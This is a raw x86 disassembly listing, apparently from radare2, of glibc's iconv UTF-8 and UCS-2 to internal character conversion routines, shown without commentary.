mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_20h]
mov ecx, dword [ecx + 8]
add eax, 0x3c
add edx, 0x24
mov dword [var_30h], eax
mov dword [var_34h], edx
mov dword [var_98h], ecx
mov dword [var_3ch], ecx
and ecx, 1
jne 0x805a3a2
mov eax, dword [eax + 0x14]
mov dword [var_38h], eax
test ebx, ebx
jne 0x805af37
mov edx, dword [arg_10h]
mov edi, dword [arg_18h]
mov edx, dword [edx]
test edi, edi
mov dword [var_9ch], edx
mov dword [var_40h], edx
jne 0x805af2d
mov ecx, dword [arg_ch]
mov edx, dword [ecx]
mov esi, dword [arg_1ch]
mov ecx, dword [arg_ch]
mov dword [var_4ch], 0
lea eax, [var_20h]
mov ebx, dword [arg_24h]
mov dword [var_24h], edx
mov dword [var_20h], 0
test esi, esi
mov ecx, dword [ecx + 4]
cmove eax, dword [var_4ch]
test ebx, ebx
mov dword [var_44h], ecx
mov dword [var_4ch], eax
je 0x805a540
mov eax, dword [arg_ch]
mov eax, dword [eax + 0x14]
mov dword [var_50h], eax
mov eax, dword [eax]
test al, 7
je 0x805a540
mov ecx, dword [arg_18h]
test ecx, ecx
jne 0x805af09
mov ecx, dword [var_40h]
mov dword [var_5ch], edx
mov dword [var_58h], 0
mov edx, dword [var_50h]
movzx ebx, al
mov dword [var_28h], ecx
mov ecx, dword [edx + 4]
mov edx, eax
sar edx, 8
movzx eax, byte [edx + 0x8093d47]
mov byte [var_bp_1ch], al
dec edx
cmp edx, ebx
jae 0x805a453
mov eax, ecx
and eax, 0x3f
or eax, 0xffffff80
mov byte [edx + ebp - 0x1c], al
shr ecx, 6
cmp edx, 1
ja 0x805a442
mov esi, dword [var_28h]
movzx edx, byte [var_bp_1ch]
mov eax, esi
sub eax, ebx
or edx, ecx
inc eax
mov byte [var_bp_1ch], dl
cmp eax, dword [arg_14h]
ja 0x805ae40
mov eax, dword [var_5ch]
mov edx, dword [var_44h]
add eax, 4
mov dword [var_60h], eax
cmp dword [var_60h], edx
mov eax, 5
ja 0x805a51c
mov eax, esi
inc esi
mov dword [var_28h], esi
movzx eax, byte [eax]
mov byte [ebp + ebx - 0x1c], al
inc ebx
cmp ebx, 5
ja 0x805a4aa
mov esi, dword [var_28h]
cmp esi, dword [arg_14h]
jb 0x805a48f
lea esi, [var_bp_1ch]
lea ebx, [ebx + esi]
mov dword [var_28h], esi
mov dword [var_54h], ebx
movzx ebx, byte [var_bp_1ch]
cmp ebx, 0x7f
ja 0x805acc0
lea esi, [var_1bh]
mov edx, dword [var_5ch]
mov ecx, dword [var_60h]
mov dword [var_28h], esi
mov esi, dword [var_28h]
mov dword [edx], ebx
mov dword [var_5ch], ecx
lea eax, [var_bp_1ch]
cmp esi, eax
je 0x805abb9
mov ecx, dword [var_50h]
lea edx, [var_bp_1ch]
mov eax, esi
sub eax, edx
mov edx, dword [ecx]
and edx, 7
cmp eax, edx
jle 0x805ab95
sub eax, edx
mov ecx, dword [var_5ch]
mov dword [var_58h], 0
add eax, dword [var_40h]
mov edx, dword [arg_10h]
mov dword [edx], eax
mov eax, dword [var_50h]
mov dword [var_24h], ecx
mov dword [eax], 0
mov eax, dword [var_58h]
test eax, eax
jne 0x805a676
mov ecx, dword [arg_ch]
mov eax, dword [arg_10h]
mov ecx, dword [ecx + 8]
mov eax, dword [eax]
mov dword [var_98h], ecx
mov dword [var_9ch], eax
nop
lea esi, [esi]
mov edi, dword [var_9ch]
mov ecx, dword [arg_14h]
mov dword [var_68h], 4
mov edx, dword [var_24h]
cmp edi, ecx
mov dword [var_48h], edx
mov dword [var_6ch], edx
je 0x805a591
lea esi, [esi]
mov eax, dword [var_6ch]
mov edx, dword [var_44h]
add eax, 4
cmp eax, edx
mov dword [var_70h], eax
ja 0x805ab89
movzx ebx, byte [edi]
cmp ebx, 0x7f
ja 0x805aa24
inc edi
mov ecx, dword [var_6ch]
mov eax, dword [var_70h]
mov dword [ecx], ebx
mov dword [var_6ch], eax
cmp edi, dword [arg_14h]
jne 0x805a560
mov edx, dword [arg_10h]
mov ecx, dword [var_6ch]
mov esi, dword [var_68h]
mov dword [edx], edi
mov dword [var_24h], ecx
mov eax, dword [arg_18h]
test eax, eax
jne 0x805aa1a
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 0x20]
test ebx, ebx
je 0x805a5c6
mov eax, dword [ebx + 4]
test eax, eax
jne 0x805a9e3
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805a5b4
mov eax, dword [arg_ch]
inc dword [eax + 0xc]
test byte [eax + 8], 1
jne 0x805a9ce
mov edx, dword [var_48h]
cmp dword [var_24h], edx
jbe 0x805a648
mov eax, dword [eax]
mov dword [var_2ch], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_24h]
mov edx, dword [arg_24h]
mov dword [var_18h], 0
mov ecx, dword [arg_1ch]
mov dword [var_10h], 0
mov dword [var_ch], eax
mov dword [var_1ch], edx
lea eax, [var_2ch]
mov dword [var_8h], eax
mov edx, dword [var_30h]
mov dword [var_14h], ecx
mov eax, dword [var_34h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_38h]
cmp eax, 4
mov dword [var_78h], eax
je 0x805a9b5
mov ecx, dword [var_2ch]
cmp ecx, dword [var_24h]
mov dword [var_7ch], ecx
jne 0x805a752
mov esi, dword [var_78h]
test esi, esi
jne 0x805a66d
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, dword [ecx]
mov dword [var_24h], eax
mov edx, dword [edx]
mov eax, dword [ecx + 8]
mov dword [var_9ch], edx
mov dword [var_98h], eax
jmp 0x805a540
mov eax, dword [arg_24h]
test eax, eax
jne 0x805a681
mov eax, esi
add esp, 0xb0
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x805a674
mov eax, dword [arg_10h]
mov ecx, dword [arg_ch]
mov edx, dword [eax]
mov ecx, dword [ecx + 0x14]
mov eax, dword [arg_14h]
mov dword [var_94h], ecx
movzx ebx, byte [edx]
sub eax, edx
mov dword [ecx], eax
lea eax, [ebx - 0xc2]
cmp eax, 0x1d
ja 0x805a6fa
mov edi, 2
and ebx, 0x1f
lea eax, [edx + 1]
lea ecx, [edi - 1]
mov edx, dword [arg_10h]
mov dword [edx], eax
cmp eax, dword [arg_14h]
jae 0x805a6e0
mov eax, dword [arg_10h]
shl ebx, 6
dec ecx
mov edx, dword [eax]
movzx eax, byte [edx]
inc edx
and eax, 0x3f
or ebx, eax
mov eax, dword [arg_10h]
mov dword [eax], edx
cmp edx, dword [arg_14h]
jb 0x805a6c4
mov edx, dword [var_94h]
lea ecx, [ecx + ecx*2]
shl edi, 8
add ecx, ecx
shl ebx, cl
or dword [edx], edi
mov dword [edx + 4], ebx
jmp 0x805a674
mov eax, ebx
and eax, 0xf0
cmp eax, 0xe0
jne 0x805a712
mov edi, 3
and ebx, 0xf
jmp 0x805a6b4
mov eax, ebx
and eax, 0xf8
cmp eax, 0xf0
jne 0x805a72a
mov edi, 4
and ebx, 7
jmp 0x805a6b4
mov eax, ebx
and eax, 0xfc
cmp eax, 0xf8
jne 0x805a745
mov edi, 5
and ebx, 3
jmp 0x805a6b4
mov edi, 6
and ebx, 1
jmp 0x805a6b4
mov edx, dword [var_9ch]
mov eax, dword [arg_10h]
mov dword [var_84h], 4
mov ecx, dword [var_48h]
mov dword [eax], edx
mov edi, edx
cmp edx, dword [arg_14h]
mov eax, dword [arg_ch]
mov dword [var_24h], ecx
mov dword [var_88h], ecx
mov eax, dword [eax + 8]
mov dword [var_80h], eax
je 0x805a7c3
mov edx, dword [var_88h]
mov ecx, dword [var_7ch]
add edx, 4
cmp edx, ecx
mov dword [var_8ch], edx
ja 0x805a9a6
movzx ebx, byte [edi]
cmp ebx, 0x7f
ja 0x805a838
inc edi
mov edx, dword [var_88h]
mov ecx, dword [var_8ch]
mov dword [edx], ebx
mov dword [var_88h], ecx
cmp edi, dword [arg_14h]
jne 0x805a783
mov eax, dword [arg_10h]
mov edx, dword [var_88h]
mov dword [eax], edi
mov dword [var_24h], edx
cmp edx, dword [var_7ch]
jne 0x805a817
cmp dword [var_84h], 5
jne 0x805a7f3
cmp edx, dword [var_48h]
jne 0x805a645
mov ecx, dword [arg_ch]
dec dword [ecx + 0xc]
jmp 0x805a645
mov dword [var_ch], str.__gconv_transform_utf8_internal
mov dword [var_8h], 0x2e0
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.nstatus____GCONV_FULL_OUTPUT
call fcn.0805efc0
mov dword [var_ch], str.__gconv_transform_utf8_internal
mov dword [var_8h], 0x2df
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbuf__outerr
jmp 0x805a812
lea eax, [ebx - 0xc2]
cmp eax, 0x1d
ja 0x805a910
mov ecx, 2
and ebx, 0x1f
mov eax, dword [arg_14h]
lea edx, [ecx + edi]
mov dword [var_90h], edx
cmp edx, eax
ja 0x805a8d2
mov esi, 1
cmp esi, ecx
jae 0x805a885
movzx edx, byte [esi + edi]
mov eax, edx
and eax, 0xc0
add eax, 0xffffff80
jne 0x805a8cc
shl ebx, 6
and edx, 0x3f
inc esi
or ebx, edx
cmp esi, ecx
jb 0x805a868
cmp ecx, 2
jbe 0x805a896
lea ecx, [ecx + ecx*4 - 4]
mov eax, ebx
shr eax, cl
test eax, eax
je 0x805a8a1
mov edi, dword [var_90h]
jmp 0x805a7aa
mov eax, dword [var_4ch]
mov dword [var_84h], 6
test eax, eax
je 0x805a7c3
test byte [var_80h], 2
je 0x805a7c3
mov eax, dword [var_4ch]
add edi, esi
inc dword [eax]
jmp 0x805a7be
cmp esi, ecx
jae 0x805a885
jmp 0x805a8a1
lea eax, [edi + 1]
mov esi, 1
cmp eax, dword [arg_14h]
mov edx, eax
jae 0x805a8fb
movzx eax, byte [esi + edi]
lea edx, [esi + edi]
and eax, 0xc0
add eax, 0xffffff80
jne 0x805a8fb
inc esi
lea edx, [esi + edi]
cmp edx, dword [arg_14h]
jb 0x805a8e1
cmp edx, dword [arg_14h]
mov dword [var_84h], 7
je 0x805a7c3
jmp 0x805a8a1
mov eax, ebx
and eax, 0xf0
cmp eax, 0xe0
jne 0x805a92b
mov ecx, 3
and ebx, 0xf
jmp 0x805a84f
mov eax, ebx
and eax, 0xf8
cmp eax, 0xf0
jne 0x805a946
mov ecx, 4
and ebx, 7
jmp 0x805a84f
mov eax, ebx
and eax, 0xfc
cmp eax, 0xf8
jne 0x805a961
mov ecx, 5
and ebx, 3
jmp 0x805a84f
mov eax, ebx
and eax, 0xfe
cmp eax, 0xfc
jne 0x805a97c
mov ecx, 6
and ebx, 1
jmp 0x805a84f
xor esi, esi
inc esi
lea eax, [esi + edi]
cmp eax, dword [arg_14h]
jae 0x805a8a1
movzx eax, byte [eax]
and eax, 0xc0
add eax, 0xffffff80
jne 0x805a8a1
cmp esi, 4
jbe 0x805a97e
jmp 0x805a8a1
mov dword [var_84h], 5
jmp 0x805a7c3
cmp dword [var_68h], 5
jne 0x805a648
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_24h], eax
jmp 0x805a648
mov eax, dword [var_24h]
mov ecx, dword [arg_ch]
mov edx, dword [arg_1ch]
mov dword [ecx], eax
mov eax, dword [var_20h]
add dword [edx], eax
jmp 0x805a66d
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_24h]
mov edx, dword [arg_10h]
mov ecx, dword [var_9ch]
mov dword [var_10h], eax
mov eax, dword [var_48h]
mov dword [var_ch], eax
mov eax, dword [edx]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805a5bf
mov edx, dword [arg_18h]
mov dword [edx], ecx
jmp 0x805a674
lea eax, [ebx - 0xc2]
cmp eax, 0x1d
ja 0x805aaf3
mov ecx, 2
and ebx, 0x1f
mov edx, dword [arg_14h]
lea eax, [ecx + edi]
mov dword [var_74h], eax
cmp eax, edx
ja 0x805aab8
mov esi, 1
cmp esi, ecx
jae 0x805aa6e
movzx edx, byte [esi + edi]
mov eax, edx
and eax, 0xc0
add eax, 0xffffff80
jne 0x805aab2
shl ebx, 6
and edx, 0x3f
inc esi
or ebx, edx
cmp esi, ecx
jb 0x805aa51
cmp ecx, 2
jbe 0x805aa7f
lea ecx, [ecx + ecx*4 - 4]
mov eax, ebx
shr eax, cl
test eax, eax
je 0x805aa87
mov edi, dword [var_74h]
jmp 0x805a581
mov eax, dword [var_4ch]
mov dword [var_68h], 6
test eax, eax
je 0x805a591
test byte [var_98h], 2
je 0x805a591
mov ecx, dword [var_4ch]
add edi, esi
inc dword [ecx]
jmp 0x805a58c
cmp esi, ecx
jae 0x805aa6e
jmp 0x805aa87
lea eax, [edi + 1]
mov esi, 1
cmp eax, dword [arg_14h]
mov edx, eax
jae 0x805aae1
movzx eax, byte [esi + edi]
lea edx, [esi + edi]
and eax, 0xc0
add eax, 0xffffff80
jne 0x805aae1
inc esi
lea edx, [esi + edi]
cmp edx, dword [arg_14h]
jb 0x805aac7
cmp edx, dword [arg_14h]
mov dword [var_68h], 7
je 0x805a591
jmp 0x805aa87
mov eax, ebx
and eax, 0xf0
cmp eax, 0xe0
jne 0x805ab0e
mov ecx, 3
and ebx, 0xf
jmp 0x805aa3b
mov eax, ebx
and eax, 0xf8
cmp eax, 0xf0
jne 0x805ab29
mov ecx, 4
and ebx, 7
jmp 0x805aa3b
mov eax, ebx
and eax, 0xfc
cmp eax, 0xf8
jne 0x805ab44
mov ecx, 5
and ebx, 3
jmp 0x805aa3b
mov eax, ebx
and eax, 0xfe
cmp eax, 0xfc
jne 0x805ab5f
mov ecx, 6
and ebx, 1
jmp 0x805aa3b
xor esi, esi
inc esi
lea eax, [esi + edi]
cmp eax, dword [arg_14h]
jae 0x805aa87
movzx eax, byte [eax]
and eax, 0xc0
add eax, 0xffffff80
jne 0x805aa87
cmp esi, 4
jbe 0x805ab61
jmp 0x805aa87
mov dword [var_68h], 5
jmp 0x805a591
mov dword [var_ch], str.utf8_internal_loop_single
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x805a812
cmp dword [var_58h], 7
jne 0x805a519
lea eax, [var_16h]
cmp dword [var_54h], eax
je 0x805ac9b
mov ecx, dword [var_50h]
mov edx, dword [var_54h]
mov eax, dword [ecx]
sub edx, esi
mov ecx, edx
and eax, 7
sub ecx, eax
mov eax, ecx
mov ecx, dword [arg_10h]
add eax, dword [var_40h]
mov dword [ecx], eax
mov eax, dword [var_50h]
movzx ebx, byte [esi]
mov dword [eax], edx
lea eax, [ebx - 0xc2]
cmp eax, 0x1d
ja 0x805ac43
mov esi, 2
and ebx, 0x1f
mov eax, dword [var_28h]
lea ecx, [esi - 1]
inc eax
cmp eax, dword [var_54h]
mov dword [var_28h], eax
jae 0x805ac2c
mov edx, dword [var_28h]
shl ebx, 6
dec ecx
movzx eax, byte [edx]
inc edx
mov dword [var_28h], edx
and eax, 0x3f
or ebx, eax
cmp edx, dword [var_54h]
jb 0x805ac14
mov edx, dword [var_50h]
lea ecx, [ecx + ecx*2]
shl esi, 8
add ecx, ecx
shl ebx, cl
or dword [edx], esi
mov dword [edx + 4], ebx
jmp 0x805a519
mov eax, ebx
and eax, 0xf0
cmp eax, 0xe0
jne 0x805ac5b
mov esi, 3
and ebx, 0xf
jmp 0x805ac05
mov eax, ebx
and eax, 0xf8
cmp eax, 0xf0
jne 0x805ac73
mov esi, 4
and ebx, 7
jmp 0x805ac05
mov eax, ebx
and eax, 0xfc
cmp eax, 0xf8
jne 0x805ac8e
mov esi, 5
and ebx, 3
jmp 0x805ac05
mov esi, 6
and ebx, 1
jmp 0x805ac05
mov dword [var_ch], str.utf8_internal_loop_single
mov dword [var_8h], 0x1bb
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_6_
jmp 0x805a812
nop
lea eax, [ebx - 0xc2]
cmp eax, 0x1d
ja 0x805ad9f
and ebx, 0x1f
mov dword [var_64h], 2
lea edx, [var_bp_1ch]
mov eax, edx
add eax, dword [var_64h]
cmp eax, dword [var_54h]
ja 0x805ad64
mov edi, 1
cmp edi, dword [var_64h]
jae 0x805ad0f
movzx edx, byte [edi + ebp - 0x1c]
mov eax, edx
and eax, 0xc0
add eax, 0xffffff80
jne 0x805ad5d
shl ebx, 6
and edx, 0x3f
inc edi
or ebx, edx
cmp edi, dword [var_64h]
jb 0x805acf0
cmp dword [var_64h], 2
jbe 0x805ad24
mov eax, dword [var_64h]
lea ecx, [eax + eax*4 - 4]
mov eax, ebx
shr eax, cl
test eax, eax
je 0x805ad2f
lea esi, [var_bp_1ch]
add esi, dword [var_64h]
jmp 0x805a4c6
mov edx, dword [var_4ch]
mov dword [var_58h], 6
test edx, edx
je 0x805a4d7
test byte [var_3ch], 2
je 0x805a4d7
mov ecx, dword [var_4ch]
lea esi, [var_bp_1ch]
add esi, edi
mov dword [var_28h], esi
inc dword [ecx]
jmp 0x805a4d7
cmp edi, dword [var_64h]
jae 0x805ad0f
jmp 0x805ad2f
mov eax, edx
mov edi, 1
inc eax
cmp eax, dword [var_54h]
jae 0x805ad88
movzx eax, byte [edi + edx]
and eax, 0xc0
add eax, 0xffffff80
jne 0x805ad88
inc edi
lea eax, [edi + edx]
cmp eax, dword [var_54h]
jb 0x805ad71
lea eax, [var_bp_1ch]
mov dword [var_58h], 7
add eax, edi
cmp eax, dword [var_54h]
je 0x805a4d7
jmp 0x805ad2f
mov eax, ebx
and eax, 0xf0
cmp eax, 0xe0
jne 0x805adbc
and ebx, 0xf
mov dword [var_64h], 3
jmp 0x805acd9
mov eax, ebx
and eax, 0xf8
cmp eax, 0xf0
jne 0x805add9
and ebx, 7
mov dword [var_64h], 4
jmp 0x805acd9
mov eax, ebx
and eax, 0xfc
cmp eax, 0xf8
jne 0x805adf6
and ebx, 3
mov dword [var_64h], 5
jmp 0x805acd9
mov eax, ebx
and eax, 0xfe
cmp eax, 0xfc
jne 0x805ae13
and ebx, 1
mov dword [var_64h], 6
jmp 0x805acd9
xor edi, edi
inc edi
lea eax, [var_bp_1ch]
add eax, edi
cmp eax, dword [var_54h]
jae 0x805ad2f
movzx eax, byte [eax]
and eax, 0xc0
add eax, 0xffffff80
jne 0x805ad2f
cmp edi, 4
jbe 0x805ae15
jmp 0x805ad2f
nop
mov eax, dword [arg_14h]
mov ecx, dword [arg_10h]
movzx edi, dl
mov edx, dword [var_50h]
lea esi, [var_bp_1ch]
mov dword [ecx], eax
lea eax, [edi - 0xc2]
mov dword [var_28h], esi
add esi, ebx
mov dword [edx], ebx
cmp eax, 0x1d
mov dword [var_54h], esi
ja 0x805aeb1
mov ebx, 2
and edi, 0x1f
mov eax, dword [var_28h]
lea ecx, [ebx - 1]
inc eax
cmp eax, dword [var_54h]
mov dword [var_28h], eax
jae 0x805ae95
mov edx, dword [var_28h]
shl edi, 6
dec ecx
movzx eax, byte [edx]
inc edx
mov dword [var_28h], edx
and eax, 0x3f
or edi, eax
cmp edx, dword [var_54h]
jb 0x805ae7d
lea ecx, [ecx + ecx*2]
shl ebx, 8
mov eax, 7
add ecx, ecx
shl edi, cl
mov ecx, dword [var_50h]
or dword [ecx], ebx
mov dword [ecx + 4], edi
jmp 0x805a51c
mov eax, edi
and eax, 0xf0
cmp eax, 0xe0
jne 0x805aec9
mov ebx, 3
and edi, 0xf
jmp 0x805ae6e
mov eax, edi
and eax, 0xf8
cmp eax, 0xf0
jne 0x805aee1
mov ebx, 4
and edi, 7
jmp 0x805ae6e
mov eax, edi
and eax, 0xfc
cmp eax, 0xf8
jne 0x805aefc
mov ebx, 5
and edi, 3
jmp 0x805ae6e
mov ebx, 6
and edi, 1
jmp 0x805ae6e
mov dword [var_ch], str.__gconv_transform_utf8_internal
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x805a812
mov eax, dword [arg_18h]
mov edx, dword [eax]
jmp 0x805a3c8
mov eax, dword [arg_18h]
test eax, eax
jne 0x805afa9
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x805a674
mov ecx, dword [var_38h]
mov dword [esp], ecx
call fcn.08083520
mov eax, dword [arg_24h]
mov edx, dword [arg_1ch]
mov dword [var_18h], ebx
mov ecx, dword [var_34h]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_1ch], eax
mov dword [var_14h], edx
mov eax, dword [var_30h]
mov dword [var_4h], ecx
mov dword [esp], eax
call dword [var_38h]
mov esi, eax
jmp 0x805a674
mov dword [var_ch], str.__gconv_transform_utf8_internal
mov dword [var_8h], 0x19f
jmp 0x805af19
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x68
mov dword [var_28h], 0
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_24h], edx
mov dword [var_20h], eax
mov eax, dword [arg_ch]
mov edx, dword [eax + 8]
test dl, 1
mov dword [var_2ch], edx
jne 0x805affc
mov eax, dword [var_20h]
mov eax, dword [eax + 0x14]
mov dword [var_28h], eax
test ebx, ebx
jne 0x805b4c9
mov ebx, dword [arg_10h]
mov eax, dword [arg_18h]
mov ebx, dword [ebx]
test eax, eax
mov dword [var_54h], ebx
mov edi, ebx
jne 0x805b4bf
mov eax, dword [arg_ch]
mov ecx, dword [eax]
mov eax, dword [arg_ch]
mov esi, dword [arg_1ch]
mov dword [var_38h], 0
mov ebx, dword [arg_24h]
mov dword [var_14h], ecx
mov dword [var_10h], 0
mov eax, dword [eax + 4]
test esi, esi
mov dword [var_30h], eax
lea eax, [var_10h]
cmove eax, dword [var_38h]
test ebx, ebx
mov dword [var_38h], eax
je 0x805b151
mov ebx, dword [arg_ch]
mov esi, dword [ebx + 0x14]
mov eax, dword [esi]
and eax, 7
je 0x805b151
mov edx, dword [arg_18h]
test edx, edx
jne 0x805b49b
mov dword [var_44h], ecx
mov dword [var_40h], 0
mov ebx, edi
xor ecx, ecx
cmp dword [arg_18h], eax
jae 0x805b096
lea edx, [var_16h]
movzx eax, byte [ecx + esi + 4]
mov byte [ecx + edx], al
mov eax, dword [esi]
inc ecx
and eax, 7
cmp ecx, eax
jb 0x805b084
mov eax, edi
sub eax, ecx
add eax, 2
cmp eax, dword [arg_14h]
ja 0x805b477
mov eax, dword [var_44h]
mov edx, dword [var_30h]
add eax, 4
mov dword [var_48h], eax
cmp dword [var_48h], edx
mov eax, 5
ja 0x805b13b
lea edx, [var_16h]
movzx eax, byte [ebx]
inc ebx
mov byte [edx + ecx], al
inc ecx
cmp ecx, 1
ja 0x805b0d1
cmp ebx, dword [arg_14h]
jb 0x805b0bf
lea eax, [edx + ecx]
mov ebx, edx
movzx edx, word [var_16h]
mov dword [var_3ch], eax
lea eax, [edx + 0x2800]
cmp ax, 0x7ff
jbe 0x805b44e
mov ebx, dword [var_44h]
movzx eax, dx
mov dword [ebx], eax
lea ebx, [var_14h]
mov eax, dword [var_48h]
mov dword [var_44h], eax
lea edx, [var_16h]
cmp ebx, edx
je 0x805b3e8
mov ecx, dword [esi]
mov eax, ebx
sub eax, edx
mov edx, ecx
and edx, 7
cmp eax, edx
jle 0x805b3c4
mov ebx, dword [arg_10h]
sub eax, edx
and ecx, 0xfffffff8
lea eax, [eax + edi]
mov dword [var_40h], 0
mov dword [esi], ecx
mov dword [ebx], eax
mov eax, dword [var_44h]
mov dword [var_14h], eax
mov eax, dword [var_40h]
test eax, eax
jne 0x805b27b
mov ebx, dword [arg_ch]
mov eax, dword [arg_10h]
mov edx, dword [ebx + 8]
mov eax, dword [eax]
mov dword [var_54h], eax
mov esi, dword [var_54h]
mov eax, dword [arg_14h]
mov dword [var_4ch], 4
mov ebx, dword [var_14h]
cmp esi, eax
mov dword [var_34h], ebx
mov edi, ebx
je 0x805b1b0
and edx, 2
mov dword [var_50h], edx
lea ecx, [esi + 2]
cmp ecx, dword [arg_14h]
ja 0x805b3b8
lea ebx, [edi + 4]
cmp ebx, dword [var_30h]
ja 0x805b3ac
movzx edx, word [esi]
lea eax, [edx + 0x2800]
cmp ax, 0x7ff
jbe 0x805b383
movzx eax, dx
mov esi, ecx
mov dword [edi], eax
mov edi, ebx
cmp ecx, dword [arg_14h]
jne 0x805b170
lea esi, [esi]
mov ebx, dword [arg_10h]
mov dword [ebx], esi
mov esi, dword [var_4ch]
mov dword [var_14h], edi
mov eax, dword [arg_18h]
test eax, eax
jne 0x805b379
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x805b1e2
mov eax, dword [ebx + 4]
test eax, eax
jne 0x805b345
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805b1d0
mov edx, dword [arg_ch]
inc dword [edx + 0xc]
test byte [edx + 8], 1
jne 0x805b330
mov ebx, dword [var_34h]
cmp dword [var_14h], ebx
jbe 0x805b261
mov eax, dword [edx]
mov dword [var_1ch], eax
mov eax, dword [var_28h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov edx, dword [arg_24h]
mov dword [var_18h], 0
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], eax
mov dword [var_sp_1ch], edx
lea eax, [var_1ch]
mov dword [var_8h], eax
mov edx, dword [var_20h]
mov dword [var_sp_14h], ebx
mov eax, dword [var_24h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_28h]
cmp eax, 4
mov ecx, eax
je 0x805b317
mov edx, dword [var_1ch]
mov eax, dword [var_14h]
cmp edx, eax
jne 0x805b302
mov esi, ecx
test esi, esi
jne 0x805b272
mov ebx, dword [arg_ch]
mov eax, dword [ebx]
mov dword [var_14h], eax
jmp 0x805b146
mov eax, dword [arg_24h]
test eax, eax
jne 0x805b283
mov eax, esi
add esp, 0x68
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x805b279
mov edx, dword [arg_10h]
mov eax, dword [arg_14h]
mov edx, dword [edx]
sub eax, edx
mov dword [var_54h], edx
cmp eax, 3
jg 0x805b2de
xor ecx, ecx
mov ebx, dword [arg_14h]
cmp dword [var_54h], ebx
jae 0x805b2cd
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
mov edx, dword [eax + 0x14]
mov eax, dword [var_54h]
inc eax
mov dword [ebx], eax
mov ebx, dword [var_54h]
movzx eax, byte [ebx]
mov byte [ecx + edx + 4], al
mov ebx, dword [arg_14h]
mov edx, dword [arg_10h]
inc ecx
mov eax, dword [edx]
cmp eax, ebx
mov dword [var_54h], eax
jb 0x805b2a4
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ecx
mov dword [edx], eax
jmp 0x805b279
mov dword [var_ch], str.__gconv_transform_ucs2_internal
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
sub eax, edx
mov ebx, dword [arg_10h]
mov edx, eax
shr edx, 0x1f
add eax, edx
sar eax, 1
sub dword [ebx], eax
jmp 0x805b25f
cmp dword [var_4ch], 5
jne 0x805b261
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x805b261
mov eax, dword [var_14h]
mov ebx, dword [arg_ch]
mov edx, dword [arg_1ch]
mov dword [ebx], eax
mov eax, dword [var_10h]
add dword [edx], eax
jmp 0x805b272
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_34h]
mov eax, dword [var_14h]
mov dword [var_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [arg_10h]
mov eax, dword [edx]
mov dword [var_8h], eax
mov eax, dword [var_54h]
mov dword [var_4h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805b1db
mov edx, dword [arg_18h]
mov eax, edi
jmp 0x805b2da
mov eax, dword [var_38h]
mov dword [var_4ch], 6
test eax, eax
je 0x805b1b0
mov eax, dword [var_50h]
test eax, eax
je 0x805b1b0
mov edx, dword [var_38h]
mov esi, ecx
inc dword [edx]
jmp 0x805b1a4
mov dword [var_4ch], 5
jmp 0x805b1b0
mov dword [var_4ch], 7
jmp 0x805b1b0
mov dword [var_ch], str.ucs2_internal_loop_single
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x805b2fd
cmp dword [var_40h], 7
jne 0x805b138
lea eax, [ebx + 2]
cmp dword [var_3ch], eax
je 0x805b42a
mov eax, dword [var_3ch]
mov edx, dword [esi]
sub eax, ebx
and edx, 7
sub eax, edx
cmp ebx, dword [var_3ch]
mov edx, dword [arg_10h]
lea eax, [eax + edi]
mov dword [edx], eax
jae 0x805b138
movzx eax, byte [ebx]
inc ebx
mov byte [esi + ecx + 4], al
inc ecx
cmp ebx, dword [var_3ch]
jb 0x805b417
jmp 0x805b138
mov dword [var_ch], str.ucs2_internal_loop_single
mov dword [var_8h], 0x1bb
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_2_
jmp 0x805b2fd
mov eax, dword [var_38h]
mov dword [var_40h], 6
test eax, eax
je 0x805b0fe
test byte [var_2ch], 2
je 0x805b0fe
mov edx, dword [var_38h]
lea ebx, [var_14h]
inc dword [edx]
jmp 0x805b0fe
